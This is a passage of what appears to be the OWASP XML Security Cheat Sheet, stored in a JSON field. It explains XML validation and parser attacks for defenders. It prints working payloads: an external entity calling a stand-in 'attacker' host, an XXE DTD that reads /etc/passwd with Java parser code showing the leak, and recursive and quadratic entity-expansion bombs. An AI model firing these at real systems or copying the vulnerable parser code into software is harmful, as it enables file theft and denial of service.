Injection](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection.html)\r\n"
    },
    {
      "XML_Security_Cheat_Sheet.md": "# XML Security Cheat Sheet\r\n\r\n## Introduction\r\n\r\nSpecifications for XML and XML schemas include multiple security flaws. At the same time, these specifications provide the tools required to protect XML applications. Even though we use XML schemas to define the security of XML documents, they can be used to perform a variety of attacks: file retrieval, server side request forgery, port scanning, or brute forcing. This cheat sheet exposes how to exploit the different possibilities in libraries and software divided in two sections:\r\n\r\n- **Malformed XML Documents**: vulnerabilities using not well formed documents.\r\n- **Invalid XML Documents**: vulnerabilities using documents that do not have the expected structure.\r\n\r\n## Malformed XML Documents\r\n\r\nThe W3C XML specification defines a set of principles that XML documents must follow to be considered well formed. When a document violates any of these principles, it must be considered a fatal error and the data it contains is considered malformed. Multiple tactics will cause a malformed document: removing an ending tag, rearranging the order of elements into a nonsensical structure, introducing forbidden characters, and so on. The XML parser should stop execution once detecting a fatal error. The document should not undergo any additional processing, and the application should display an error message.\r\n\r\nThe recommendation to avoid these vulnerabilities are to use an XML processor that follows W3C specifications and does not take significant additional time to process malformed documents. In addition, use only well-formed documents and validate the contents of each element and attribute to process only valid values within predefined boundaries.\r\n\r\n### More Time Required\r\n\r\nA malformed document may affect the consumption of Central Processing Unit (CPU) resources. In certain scenarios, the amount of time required to process malformed documents may be greater than that required for well-formed documents. When this happens, an attacker may exploit an asymmetric resource consumption attack to take advantage of the greater processing time to cause a Denial of Service (DoS).\r\n\r\nTo analyze the likelihood of this attack, analyze the time taken by a regular XML document vs the time taken by a malformed version of that same document. Then, consider how an attacker could use this vulnerability in conjunction with an XML flood attack using multiple documents to amplify the effect.\r\n\r\n### Applications Processing Malformed Data\r\n\r\nCertain XML parsers have the ability to recover malformed documents. They can be instructed to try their best to return a valid tree with all the content that they can manage to parse, regardless of the document's noncompliance with the specifications. Since there are no predefined rules for the recovery process, the approach and results may not always be the same. Using malformed documents might lead to unexpected issues related to data integrity.\r\n\r\nThe following two scenarios illustrate attack vectors a parser will analyze in recovery mode:\r\n\r\n#### Malformed Document to Malformed Document\r\n\r\nAccording to the XML specification, the string `--` (double-hyphen) must not occur within comments. Using the recovery mode of lxml and PHP, the following document will remain the same after being recovered:\r\n\r\n```xml\r\n<element>\r\n <!-- one\r\n  <!-- another comment\r\n comment -->\r\n</element>\r\n```\r\n\r\n#### Well-Formed Document to Well-Formed Document Normalized\r\n\r\nCertain parsers may consider normalizing the contents of your `CDATA` sections. This means that they will update the special characters contained in the `CDATA` section to contain the safe versions of these characters even though is not required:\r\n\r\n```xml\r\n<element>\r\n <![CDATA[<script>a=1;</script>]]>\r\n</element>\r\n```\r\n\r\nNormalization of a `CDATA` section is not a common rule among parsers. Libxml could transform this document to its canonical version, but although well formed, its contents may be considered malformed depending on the situation:\r\n\r\n```xml\r\n<element>\r\n &lt;script&gt;a=1;&lt;/script&gt;\r\n</element>\r\n```\r\n\r\n### Coercive Parsing\r\n\r\nA coercive attack in XML involves parsing deeply nested XML documents without their corresponding ending tags. The idea is to make the victim use up -and eventually deplete- the machine's resources and cause a denial of service on the target. Reports of a DoS attack in Firefox 3.67 included the use of 30,000 open XML elements without their corresponding ending tags. Removing the closing tags simplified the attack since it requires only half of the size of a well-formed document to accomplish the same results. The number of tags being processed eventually caused a stack overflow. A simplified version of such a document would look like this:\r\n\r\n```xml\r\n<A1>\r\n <A2>\r\n  <A3>\r\n   ...\r\n    <A30000>\r\n```\r\n\r\n### Violation of XML Specification Rules\r\n\r\nUnexpected consequences may result from manipulating documents using parsers that do not follow W3C specifications. It may be possible to achieve crashes and/or code execution when the software does not properly verify how to handle incorrect XML structures. Feeding the software with fuzzed XML documents may expose this behavior.\r\n\r\n## Invalid XML Documents\r\n\r\nAttackers may introduce unexpected values in documents to take advantage of an application that does not verify whether the document contains a valid set of values. Schemas specify restrictions that help identify whether documents are valid. A valid document is well formed and complies with the restrictions of a schema, and more than one schema can be used to validate a document. These restrictions may appear in multiple files, either using a single schema language or relying on the strengths of the different schema languages.\r\n\r\nThe recommendation to avoid these vulnerabilities is that each XML document must have a precisely defined XML Schema (not [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp)) with every piece of information properly restricted to avoid problems of improper data validation. Use a local copy or a known good repository instead of the schema reference supplied in the XML document. Also, perform an integrity check of the XML schema file being referenced, bearing in mind the possibility that the repository could be compromised. In cases where the XML documents are using remote schemas, configure servers to use only secure, encrypted communications to prevent attackers from eavesdropping on network traffic.\r\n\r\n### Document without Schema\r\n\r\nConsider a bookseller that uses a web service through a web interface to make transactions. The XML document for transactions is composed of two elements: an `id` value related to an item and a certain `price`. The user may only introduce a certain `id` value using the web interface:\r\n\r\n```xml\r\n<buy>\r\n <id>123</id>\r\n <price>10</price>\r\n</buy>\r\n```\r\n\r\nIf there is no control on the document's structure, the application could also process different well-formed messages with unintended consequences. The previous document could have contained additional tags to affect the behavior of the underlying application processing its contents:\r\n\r\n```xml\r\n<buy>\r\n <id>123</id><price>0</price><id></id>\r\n <price>10</price>\r\n</buy>\r\n```\r\n\r\nNotice again how the value 123 is supplied as an `id`, but now the document includes additional opening and closing tags. The attacker closed the `id` element and sets a bogus `price` element to the value 0. The final step to keep the structure well-formed is to add one empty `id` element. After this, the application adds the closing tag for `id` and set the `price` to 10. If the application processes only the first values provided for the ID and the value without performing any type of control on the structure, it could benefit the attacker by providing the ability to buy a book without actually paying for it.\r\n\r\n### Unrestrictive Schema\r\n\r\nCertain schemas do not offer enough restrictions for the type of data that each element can receive. This is what normally happens when using [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp); it has a very limited set of possibilities compared to the type of restrictions that can be applied in XML documents. This could expose the application to undesired values within elements or attributes that would be easy to constrain when using other schema languages. In the following example, a person's `age` is validated against an inline [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) schema:\r\n\r\n```xml\r\n<!DOCTYPE person [\r\n <!ELEMENT person (name, age)>\r\n <!ELEMENT name (#PCDATA)>\r\n <!ELEMENT age (#PCDATA)>\r\n]>\r\n<person>\r\n <name>John Doe</name>\r\n <age>11111..(1.000.000digits)..11111</age>\r\n</person>\r\n```\r\n\r\nThe previous document contains an inline [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) with a root element named `person`. This element contains two elements in a specific order: `name` and then `age`. The element `name` is then defined to contain `PCDATA` as well as the element `age`. After this definition begins the well-formed and valid XML document. The element name contains an irrelevant value but the `age` element contains one million digits. Since there are no restrictions on the maximum size for the `age` element, this one-million-digit string could be sent to the server for this element. Typically this type of element should be restricted to contain no more than a certain amount of characters and constrained to a certain set of characters (for example, digits from 0 to 9, the + sign and the - sign). If not properly restricted, applications may handle potentially invalid values contained in documents. Since it is not possible to indicate specific restrictions (a maximum length for the element `name` or a valid range for the element `age`), this type of schema increases the risk of affecting the integrity and availability of resources.\r\n\r\n### Improper Data Validation\r\n\r\nWhen schemas are insecurely defined and do not provide strict rules, they may expose the application to diverse situations. The result of this could be the disclosure of internal errors or documents that hit the application's functionality with unexpected values.\r\n\r\n#### String Data Types\r\n\r\nProvided you need to use a hexadecimal value, there is no point in defining this value as a string that will later be restricted to the specific 16 hexadecimal characters. To exemplify this scenario, when using XML encryption some values must be encoded using base64 . This is the schema definition of how these values should look:\r\n\r\n```xml\r\n<element name=\"CipherData\" type=\"xenc:CipherDataType\"/>\r\n <complexType name=\"CipherDataType\">\r\n  <choice>\r\n   <element name=\"CipherValue\" type=\"base64Binary\"/>\r\n   <element ref=\"xenc:CipherReference\"/>\r\n  </choice>\r\n </complexType>\r\n```\r\n\r\nThe previous schema defines the element `CipherValue` as a base64 data type. As an example, the IBM WebSphere DataPower SOA Appliance allowed any type of characters within this element after a valid base64 value, and will consider it valid. The first portion of this data is properly checked as a base64 value, but the remaining characters could be anything else (including other sub-elements of the `CipherData` element). Restrictions are partially set for the element, which means that the information is probably tested using an application instead of the proposed sample schema.\r\n\r\n#### Numeric Data Types\r\n\r\nDefining the correct data type for numbers can be more complex since there are more options than there are for strings.\r\n\r\n##### Negative and Positive Restrictions\r\n\r\nXML Schema numeric data types can include different ranges of numbers. They could include:\r\n\r\n- **negativeInteger**: Only negative numbers\r\n- **nonNegativeInteger**: Positive numbers and the zero value\r\n- **positiveInteger**: Only positive numbers\r\n- **nonPositiveInteger**: Negative numbers and the zero value\r\n\r\nThe following sample document defines an `id` for a product, a `price`, and a `quantity` value that is under the control of an attacker:\r\n\r\n```xml\r\n<buy>\r\n <id>1</id>\r\n <price>10</price>\r\n <quantity>1</quantity>\r\n</buy>\r\n```\r\n\r\nTo avoid repeating old errors, an XML schema may be defined to prevent processing the incorrect structure in cases where an attacker wants to introduce additional elements:\r\n\r\n```xml\r\n<xs:schema xmlns:xs=\"http://www.w3.org/2001/XMLSchema\">\r\n <xs:element name=\"buy\">\r\n  <xs:complexType>\r\n   <xs:sequence>\r\n    <xs:element name=\"id\" type=\"xs:integer\"/>\r\n    <xs:element name=\"price\" type=\"xs:decimal\"/>\r\n    <xs:element name=\"quantity\" type=\"xs:integer\"/>\r\n   </xs:sequence>\r\n  </xs:complexType>\r\n </xs:element>\r\n</xs:schema>\r\n```\r\n\r\nLimiting that `quantity` to an integer data type will avoid any unexpected characters. Once the application receives the previous message, it may calculate the final price by doing `price*quantity`. However, since this data type may allow negative values, it might allow a negative result on the user's account if an attacker provides a negative number. What you probably want to see in here to avoid that logical vulnerability is positiveInteger instead of integer.\r\n\r\n##### Divide by Zero\r\n\r\nWhenever using user controlled values as denominators in a division, developers should avoid allowing the number zero. In cases where the value zero is used for division in XSLT, the error `FOAR0001` will occur. Other applications may throw other exceptions and the program may crash. There are specific data types for XML schemas that specifically avoid using the zero value. For example, in cases where negative values and zero are not considered valid, the schema could specify the data type `positiveInteger` for the element.\r\n\r\n```xml\r\n<xs:element name=\"denominator\">\r\n <xs:simpleType>\r\n  <xs:restriction base=\"xs:positiveInteger\"/>\r\n </xs:simpleType>\r\n</xs:element>\r\n```\r\n\r\nThe element `denominator` is now restricted to positive integers. This means that only values greater than zero will be considered valid. If you see any other type of restriction being used, you may trigger an error if the denominator is zero.\r\n\r\n##### Special Values: Infinity and Not a Number (NaN)\r\n\r\nThe data types `float` and `double` contain real numbers and some special values: `-Infinity` or `-INF`, `NaN`, and `+Infinity` or `INF`. These possibilities may be useful to express certain values, but they are sometimes misused. The problem is that they are commonly used to express only real numbers such as prices. This is a common error seen in other programming languages, not solely restricted to these technologies. Not considering the whole spectrum of possible values for a data type could make underlying applications fail. If the special values `Infinity` and `NaN` are not required and only real numbers are expected, the data type `decimal` is recommended:\r\n\r\n```xml\r\n<xs:schema xmlns:xs=\"http://www.w3.org/2001/XMLSchema\">\r\n <xs:element name=\"buy\">\r\n  <xs:complexType>\r\n   <xs:sequence>\r\n    <xs:element name=\"id\" type=\"xs:integer\"/>\r\n    <xs:element name=\"price\" type=\"xs:decimal\"/>\r\n    <xs:element name=\"quantity\" type=\"xs:positiveInteger\"/>\r\n   </xs:sequence>\r\n  </xs:complexType>\r\n </xs:element>\r\n</xs:schema>\r\n```\r\n\r\nThe price value will not trigger any errors when set at Infinity or NaN, because these values will not be valid. An attacker can exploit this issue if those values are allowed.\r\n\r\n#### General Data Restrictions\r\n\r\nAfter selecting the appropriate data type, developers may apply additional restrictions. Sometimes only a certain subset of values within a data type will be considered valid:\r\n\r\n##### Prefixed Values\r\n\r\nCertain types of values should only be restricted to specific sets: traffic lights will have only three types of colors, only 12 months are available, and so on. It is possible that the schema has these restrictions in place for each element or attribute. This is the most perfect allow-list scenario for an application: only specific values will be accepted. Such a constraint is called `enumeration` in XML schema. The following example restricts the contents of the element month to 12 possible values:\r\n\r\n```xml\r\n<xs:element name=\"month\">\r\n <xs:simpleType>\r\n  <xs:restriction base=\"xs:string\">\r\n   <xs:enumeration value=\"January\"/>\r\n   <xs:enumeration value=\"February\"/>\r\n   <xs:enumeration value=\"March\"/>\r\n   <xs:enumeration value=\"April\"/>\r\n   <xs:enumeration value=\"May\"/>\r\n   <xs:enumeration value=\"June\"/>\r\n   <xs:enumeration value=\"July\"/>\r\n   <xs:enumeration value=\"August\"/>\r\n   <xs:enumeration value=\"September\"/>\r\n   <xs:enumeration value=\"October\"/>\r\n   <xs:enumeration value=\"November\"/>\r\n   <xs:enumeration value=\"December\"/>\r\n  </xs:restriction>\r\n </xs:simpleType>\r\n</xs:element>\r\n```\r\n\r\nBy limiting the month element's value to any of the previous values, the application will not be manipulating random strings.\r\n\r\n##### Ranges\r\n\r\nSoftware applications, databases, and programming languages normally store information within specific ranges. Whenever using an element or an attribute in locations where certain specific sizes matter (to avoid overflows or underflows), it would be logical to check whether the data length is considered valid. The following schema could constrain a name using a minimum and a maximum length to avoid unusual scenarios:\r\n\r\n```xml\r\n<xs:element name=\"name\">\r\n <xs:simpleType>\r\n  <xs:restriction base=\"xs:string\">\r\n   <xs:minLength value=\"3\"/>\r\n   <xs:maxLength value=\"256\"/>\r\n  </xs:restriction>\r\n </xs:simpleType>\r\n</xs:element>\r\n```\r\n\r\nIn cases where the possible values are restricted to a certain specific length (let's say 8), this value can be specified as follows to be valid:\r\n\r\n```xml\r\n<xs:element name=\"name\">\r\n <xs:simpleType>\r\n  <xs:restriction base=\"xs:string\">\r\n   <xs:length value=\"8\"/>\r\n  </xs:restriction>\r\n </xs:simpleType>\r\n</xs:element>\r\n```\r\n\r\n##### Patterns\r\n\r\nCertain elements or attributes may follow a specific syntax. You can add `pattern` restrictions when using XML schemas. When you want to ensure that the data complies with a specific pattern, you can create a specific definition for it. Social security numbers (SSN) may serve as a good example; they must use a specific set of characters, a specific length, and a specific `pattern`:\r\n\r\n```xml\r\n<xs:element name=\"SSN\">\r\n <xs:simpleType>\r\n  <xs:restriction base=\"xs:token\">\r\n   <xs:pattern value=\"[0-9]{3}-[0-9]{2}-[0-9]{4}\"/>\r\n  </xs:restriction>\r\n </xs:simpleType>\r\n</xs:element>\r\n```\r\n\r\nOnly numbers between `000-00-0000` and `999-99-9999` will be allowed as values for a SSN.\r\n\r\n##### Assertions\r\n\r\nAssertion components constrain the existence and values of related elements and attributes on XML schemas. An element or attribute will be considered valid with regard to an assertion only if the test evaluates to true without raising any error. The variable `$value` can be used to reference the contents of the value being analyzed. The *Divide by Zero* section above referenced the potential consequences of using data types containing the zero value for denominators, proposing a data type containing only positive values. An opposite example would consider valid the entire range of numbers except zero. To avoid disclosing potential errors, values could be checked using an `assertion` disallowing the number zero:\r\n\r\n```xml\r\n<xs:element name=\"denominator\">\r\n <xs:simpleType>\r\n  <xs:restriction base=\"xs:integer\">\r\n   <xs:assertion test=\"$value != 0\"/>\r\n  </xs:restriction>\r\n </xs:simpleType>\r\n</xs:element>\r\n```\r\n\r\nThe assertion guarantees that the `denominator` will not contain the value zero as a valid number and also allows negative numbers to be a valid denominator.\r\n\r\n##### Occurrences\r\n\r\nThe consequences of not defining a maximum number of occurrences could be worse than coping with the consequences of what may happen when receiving extreme numbers of items to be processed. Two attributes specify minimum and maximum limits: `minOccurs` and `maxOccurs`. The default value for both the `minOccurs` and the `maxOccurs` attributes is `1`, but certain elements may require other values. For instance, if a value is optional, it could contain a `minOccurs` of 0, and if there is no limit on the maximum amount, it could contain a `maxOccurs` of `unbounded`, as in the following example:\r\n\r\n```xml\r\n<xs:schema xmlns:xs=\"http://www.w3.org/2001/XMLSchema\">\r\n <xs:element name=\"operation\">\r\n  <xs:complexType>\r\n   <xs:sequence>\r\n    <xs:element name=\"buy\" maxOccurs=\"unbounded\">\r\n     <xs:complexType>\r\n      <xs:all>\r\n       <xs:element name=\"id\" type=\"xs:integer\"/>\r\n       <xs:element name=\"price\" type=\"xs:decimal\"/>\r\n       <xs:element name=\"quantity\" type=\"xs:integer\"/>\r\n      </xs:all>\r\n     </xs:complexType>\r\n    </xs:element>\r\n  </xs:complexType>\r\n </xs:element>\r\n</xs:schema>\r\n```\r\n\r\nThe previous schema includes a root element named `operation`, which can contain an unlimited (`unbounded`) amount of buy elements. This is a common finding, since developers do not normally want to restrict maximum numbers of occurrences. Applications using limitless occurrences should test what happens when they receive an extremely large amount of elements to be processed. Since computational resources are limited, the consequences should be analyzed and eventually a maximum number ought to be used instead of an `unbounded` value.\r\n\r\n### Jumbo Payloads\r\n\r\nSending an XML document of 1GB requires only a second of server processing and might not be worth consideration as an attack. Instead, an attacker would look for a way to minimize the CPU and traffic used to generate this type of attack, compared to the overall amount of server CPU or traffic used to handle the requests.\r\n\r\n#### Traditional Jumbo Payloads\r\n\r\nThere are two primary methods to make a document larger than normal:\r\n\r\n- Depth attack: using a huge number of elements, element names, and/or element values.\r\n- Width attack: using a huge number of attributes, attribute names, and/or attribute values.\r\n\r\nIn most cases, the overall result will be a huge document. This is a short example of what this looks like:\r\n\r\n```xml\r\n<SOAPENV:ENVELOPE XMLNS:SOAPENV=\"HTTP://SCHEMAS.XMLSOAP.ORG/SOAP/ENVELOPE/\"\r\n                  XMLNS:EXT=\"HTTP://COM/IBM/WAS/WSSAMPLE/SEI/ECHO/B2B/EXTERNAL\">\r\n <SOAPENV:HEADER LARGENAME1=\"LARGEVALUE\"\r\n                 LARGENAME2=\"LARGEVALUE2\"\r\n                 LARGENAME3=\"LARGEVALUE3\" …>\r\n ...\r\n```\r\n\r\n#### \"Small\" Jumbo Payloads\r\n\r\nThe following example is a very small document, but the results of processing this could be similar to those of processing traditional jumbo payloads. The purpose of such a small payload is that it allows an attacker to send many documents fast enough to make the application consume most or all of the available resources:\r\n\r\n```xml\r\n<?xml version=\"1.0\"?>\r\n<!DOCTYPE root [\r\n <!ENTITY file SYSTEM \"http://attacker/huge.xml\" >\r\n]>\r\n<root>&file;</root>\r\n```\r\n\r\n### Schema Poisoning\r\n\r\nWhen an attacker is capable of introducing modifications to a schema, there could be multiple high-risk consequences. In particular, the effect of these consequences will be more dangerous if the schemas are using [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) (e.g., file retrieval, denial of service). An attacker could exploit this type of vulnerability in numerous scenarios, always depending on the location of the schema.\r\n\r\n#### Local Schema Poisoning\r\n\r\nLocal schema poisoning happens when schemas are available in the same host, whether or not the schemas are embedded in the same XML document .\r\n\r\n##### Embedded Schema\r\n\r\nThe most trivial type of schema poisoning takes place when the schema is defined within the same XML document. Consider the following, unknowingly vulnerable example provided by the W3C :\r\n\r\n```xml\r\n<?xml version=\"1.0\"?>\r\n<!DOCTYPE note [\r\n <!ELEMENT note (to,from,heading,body)>\r\n <!ELEMENT to (#PCDATA)>\r\n <!ELEMENT from (#PCDATA)>\r\n <!ELEMENT heading (#PCDATA)>\r\n <!ELEMENT body (#PCDATA)>\r\n]>\r\n<note>\r\n <to>Tove</to>\r\n <from>Jani</from>\r\n <heading>Reminder</heading>\r\n <body>Don't forget me this weekend</body>\r\n</note>\r\n```\r\n\r\nAll restrictions on the note element could be removed or altered, allowing the sending of any type of data to the server. Furthermore, if the server is processing external entities, the attacker could use the schema, for example, to read remote files from the server. This type of schema only serves as a suggestion for sending a document, but it must contain a way to check the embedded schema integrity to be used safely. Attacks through embedded schemas are commonly used to exploit external entity expansions. Embedded XML schemas can also assist in port scans of internal hosts or brute force attacks.\r\n\r\n##### Incorrect Permissions\r\n\r\nYou can often circumvent the risk of using remotely tampered versions by processing a local schema.\r\n\r\n```xml\r\n<!DOCTYPE note SYSTEM \"note.dtd\">\r\n<note>\r\n <to>Tove</to>\r\n <from>Jani</from>\r\n <heading>Reminder</heading>\r\n <body>Don't forget me this weekend</body>\r\n</note>\r\n```\r\n\r\nHowever, if the local schema does not contain the correct permissions, an internal attacker could alter the original restrictions. The following line exemplifies a schema using permissions that allow any user to make modifications:\r\n\r\n```text\r\n-rw-rw-rw-  1 user  staff  743 Jan 15 12:32 note.dtd\r\n```\r\n\r\nThe permissions set on `name.dtd` allow any user on the system to make modifications. This vulnerability is clearly not related to the structure of an XML or a schema, but since these documents are commonly stored in the filesystem, it is worth mentioning that an attacker could exploit this type of problem.\r\n\r\n#### Remote Schema Poisoning\r\n\r\nSchemas defined by external organizations are normally referenced remotely. If capable of diverting or accessing the network's traffic, an attacker could cause a victim to fetch a distinct type of content rather than the one originally intended.\r\n\r\n##### Man-in-the-Middle (MitM) Attack\r\n\r\nWhen documents reference remote schemas using the unencrypted Hypertext Transfer Protocol (HTTP), the communication is performed in plain text and an attacker could easily tamper with traffic. When XML documents reference remote schemas using an HTTP connection, the connection could be sniffed and modified before reaching the end user:\r\n\r\n```xml\r\n<!DOCTYPE note SYSTEM \"http://example.com/note.dtd\">\r\n<note>\r\n <to>Tove</to>\r\n <from>Jani</from>\r\n <heading>Reminder</heading>\r\n <body>Don't forget me this weekend</body>\r\n</note>\r\n```\r\n\r\nThe remote file `note.dtd` could be susceptible to tampering when transmitted using the unencrypted HTTP protocol. One tool available to facilitate this type of attack is mitmproxy .\r\n\r\n##### DNS-Cache Poisoning\r\n\r\nRemote schema poisoning may also be possible even when using encrypted protocols like Hypertext Transfer Protocol Secure (HTTPS). When software performs reverse Domain Name System (DNS) resolution on an IP address to obtain the hostname, it may not properly ensure that the IP address is truly associated with the hostname. In this case, the software enables an attacker to redirect content to their own Internet Protocol (IP) addresses.\r\n\r\nThe previous example referenced the host `example.com` using an unencrypted protocol.\r\n\r\nWhen switching to HTTPS, the location of the remote schema will look like `https://example/note.dtd`. In a normal scenario, the IP of `example.com` resolves to `1.1.1.1`:\r\n\r\n```bash\r\n$ host example.com\r\nexample.com has address 1.1.1.1\r\n```\r\n\r\nIf an attacker compromises the DNS being used, the previous hostname could now point to a new, different IP controlled by the attacker `2.2.2.2`:\r\n\r\n```bash\r\n$ host example.com\r\nexample.com has address 2.2.2.2\r\n```\r\n\r\nWhen accessing the remote file, the victim may be actually retrieving the contents of a location controlled by an attacker.\r\n\r\n##### Evil Employee Attack\r\n\r\nWhen third parties host and define schemas, the contents are not under the control of the schemas' users. Any modifications introduced by a malicious employee-or an external attacker in control of these files-could impact all users processing the schemas. Subsequently, attackers could affect the confidentiality, integrity, or availability of other services (especially if the schema in use is [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp)).\r\n\r\n### XML Entity Expansion\r\n\r\nIf the parser uses a [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp), an attacker might inject data that may adversely affect the XML parser during document processing. These adverse effects could include the parser crashing or accessing local files.\r\n\r\n#### Sample Vulnerable Java Implementations\r\n\r\nUsing the [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) capabilities of referencing local or remote files it is possible to affect the confidentiality. In addition, it is also possible to affect the availability of the resources if no proper restrictions have been set for the entities expansion. Consider the following example code of an XXE.\r\n\r\n**Sample XML**:\r\n\r\n```xml\r\n<!DOCTYPE contacts SYSTEM \"contacts.dtd\">\r\n<contacts>\r\n <contact>\r\n  <firstname>John</firstname>\r\n  <lastname>&xxe;</lastname>\r\n </contact>\r\n</contacts>\r\n```\r\n\r\n**Sample DTD**:\r\n\r\n```xml\r\n<!ELEMENT contacts (contact*)>\r\n<!ELEMENT contact (firstname,lastname)>\r\n<!ELEMENT firstname (#PCDATA)>\r\n<!ELEMENT lastname ANY>\r\n<!ENTITY xxe SYSTEM \"/etc/passwd\">\r\n```\r\n\r\n##### XXE using DOM\r\n\r\n```java\r\nimport java.io.IOException;\r\nimport javax.xml.parsers.DocumentBuilder;\r\nimport javax.xml.parsers.DocumentBuilderFactory;\r\nimport javax.xml.parsers.ParserConfigurationException;\r\nimport org.xml.sax.InputSource;\r\nimport org.w3c.dom.Document;\r\nimport org.w3c.dom.Element;\r\nimport org.w3c.dom.Node;\r\nimport org.w3c.dom.NodeList;\r\n\r\npublic class parseDocument {\r\n public static void main(String[] args) {\r\n  try {\r\n   DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\r\n   DocumentBuilder builder = factory.newDocumentBuilder();\r\n   Document doc = builder.parse(new InputSource(\"contacts.xml\"));\r\n   NodeList nodeList = doc.getElementsByTagName(\"contact\");\r\n   for (int s = 0; s < nodeList.getLength(); s++) {\r\n     Node firstNode = nodeList.item(s);\r\n     if (firstNode.getNodeType() == Node.ELEMENT_NODE) {\r\n       Element firstElement = (Element) firstNode;\r\n       NodeList firstNameElementList = firstElement.getElementsByTagName(\"firstname\");\r\n       Element firstNameElement = (Element) firstNameElementList.item(0);\r\n       NodeList firstName = firstNameElement.getChildNodes();\r\n       System.out.println(\"First Name: \"  + ((Node) firstName.item(0)).getNodeValue());\r\n       NodeList lastNameElementList = firstElement.getElementsByTagName(\"lastname\");\r\n       Element lastNameElement = (Element) lastNameElementList.item(0);\r\n       NodeList lastName = lastNameElement.getChildNodes();\r\n       System.out.println(\"Last Name: \" + ((Node) lastName.item(0)).getNodeValue());\r\n     }\r\n    }\r\n  } catch (Exception e) {\r\n    e.printStackTrace();\r\n  }\r\n }\r\n}\r\n```\r\n\r\nThe previous code produces the following output:\r\n\r\n```bash\r\n$ javac parseDocument.java ; java parseDocument\r\nFirst Name: John\r\nLast Name: ### User Database\r\n...\r\nnobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false\r\nroot:*:0:0:System Administrator:/var/root:/bin/sh\r\n```\r\n\r\n##### XXE using DOM4J\r\n\r\n```java\r\nimport org.dom4j.Document;\r\nimport org.dom4j.DocumentException;\r\nimport org.dom4j.io.SAXReader;\r\nimport org.dom4j.io.OutputFormat;\r\nimport org.dom4j.io.XMLWriter;\r\n\r\npublic class test1 {\r\n public static void main(String[] args) {\r\n  Document document = null;\r\n  try {\r\n   SAXReader reader = new SAXReader();\r\n   document = reader.read(\"contacts.xml\");\r\n  } catch (Exception e) {\r\n   e.printStackTrace();\r\n  }\r\n  OutputFormat format = OutputFormat.createPrettyPrint();\r\n  try {\r\n   XMLWriter writer = new XMLWriter( System.out, format );\r\n   writer.write( document );\r\n  } catch (Exception e) {\r\n   e.printStackTrace();\r\n  }\r\n }\r\n}\r\n```\r\n\r\nThe previous code produces the following output:\r\n\r\n```bash\r\n$ java test1\r\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<!DOCTYPE contacts SYSTEM \"contacts.dtd\">\r\n\r\n<contacts>\r\n <contact>\r\n  <firstname>John</firstname>\r\n  <lastname>### User Database\r\n...\r\nnobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false\r\nroot:*:0:0:System Administrator:/var/root:/bin/sh\r\n```\r\n\r\n##### XXE using SAX\r\n\r\n```java\r\nimport java.io.IOException;\r\nimport javax.xml.parsers.SAXParser;\r\nimport javax.xml.parsers.SAXParserFactory;\r\nimport org.xml.sax.SAXException;\r\nimport org.xml.sax.helpers.DefaultHandler;\r\n\r\npublic class parseDocument extends DefaultHandler {\r\n public static void main(String[] args) {\r\n  new parseDocument();\r\n }\r\n public parseDocument() {\r\n  try {\r\n   SAXParserFactory factory = SAXParserFactory.newInstance();\r\n   SAXParser parser = factory.newSAXParser();\r\n   parser.parse(\"contacts.xml\", this);\r\n  } catch (Exception e) {\r\n   e.printStackTrace();\r\n  }\r\n }\r\n @Override\r\n public void characters(char[] ac, int i, int j) throws SAXException {\r\n  String tmpValue = new String(ac, i, j);\r\n  System.out.println(tmpValue);\r\n }\r\n}\r\n```\r\n\r\nThe previous code produces the following output:\r\n\r\n```bash\r\n$ java parseDocument\r\nJohn\r\n#### User Database\r\n...\r\nnobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false\r\nroot:*:0:0:System Administrator:/var/root:/bin/sh\r\n```\r\n\r\n##### XXE using StAX\r\n\r\n```java\r\nimport javax.xml.parsers.SAXParserFactory;\r\nimport javax.xml.stream.XMLStreamReader;\r\nimport javax.xml.stream.XMLInputFactory;\r\nimport java.io.File;\r\nimport java.io.FileReader;\r\nimport java.io.FileInputStream;\r\n\r\npublic class parseDocument {\r\n public static void main(String[] args) {\r\n  try {\r\n   XMLInputFactory xmlif = XMLInputFactory.newInstance();\r\n   FileReader fr = new FileReader(\"contacts.xml\");\r\n   File file = new File(\"contacts.xml\");\r\n   XMLStreamReader xmlfer = xmlif.createXMLStreamReader(\"contacts.xml\",\r\n                                            new FileInputStream(file));\r\n   int eventType = xmlfer.getEventType();\r\n   while (xmlfer.hasNext()) {\r\n    eventType = xmlfer.next();\r\n    if(xmlfer.hasText()){\r\n     System.out.print(xmlfer.getText());\r\n    }\r\n   }\r\n   fr.close();\r\n  } catch (Exception e) {\r\n   e.printStackTrace();\r\n  }\r\n }\r\n}\r\n\r\n```\r\n\r\nThe previous code produces the following output:\r\n\r\n```bash\r\n$ java parseDocument\r\n<!DOCTYPE contacts SYSTEM \"contacts.dtd\">John### User Database\r\n...\r\nnobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false\r\nroot:*:0:0:System Administrator:/var/root:/bin/sh\r\n```\r\n\r\n#### Recursive Entity Reference\r\n\r\nWhen the definition of an element `A` is another element `B`, and that element `B` is defined as element `A`, that schema describes a circular reference between elements:\r\n\r\n```xml\r\n<!DOCTYPE A [\r\n <!ELEMENT A ANY>\r\n <!ENTITY A \"<A>&B;</A>\">\r\n <!ENTITY B \"&A;\">\r\n]>\r\n<A>&A;</A>\r\n```\r\n\r\n#### Quadratic Blowup\r\n\r\nInstead of defining multiple small, deeply nested entities, the attacker in this scenario defines one very large entity and refers to it as many times as possible, resulting in a quadratic expansion (*O(n^2)*).\r\n\r\nThe result of the following attack will be 100,000 x 100,000 characters in memory.\r\n\r\n```xml\r\n<!DOCTYPE root [\r\n <!ELEMENT root ANY>\r\n <!ENTITY A \"AAAAA...(a 100.000 A's)...AAAAA\">\r\n]>\r\n<root>&A;&A;&A;&A;...(a 100.000 